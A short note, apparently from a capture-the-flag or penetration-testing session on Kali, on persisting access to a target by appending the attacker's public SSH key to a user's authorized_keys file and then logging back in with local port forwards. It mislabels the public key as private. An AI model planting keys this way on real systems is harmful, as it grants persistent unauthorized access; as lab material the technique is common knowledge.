You just logged in ssh user, but your connection is temporary and limited. You dont have the password, the solution is the .ssh keys:

In your machine:
  1) ssh-keygen
  2) cat  /root/.ssh/id_ed25519.pub    (this is your private ssh identifirer/key)

At the targets temporary ssh machine:
  1) echo "ssh-ed25519 AAA?????????????????????? root@kali" » /home/ilya/.ssh/authorized_keys          (you echo the whole cat from above)
  2) ls ~/.ssh/
  3) ssh-keygen -t ed25519 -b 4096        (no need to do that, but you can generate a ssh key for the target too)

and now you can log in at this machine with:

 1) ssh -i /root/.ssh/id_ed25519 <target>@<target's_IP> -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000



  The point is you can put your machines ssh key at the targets authorized_keys:
    echo "ssh-ed25519 AAAA???????????? root@kali" » /home/<target>/.ssh/authorized_keys

  and then log in to there ssh easily
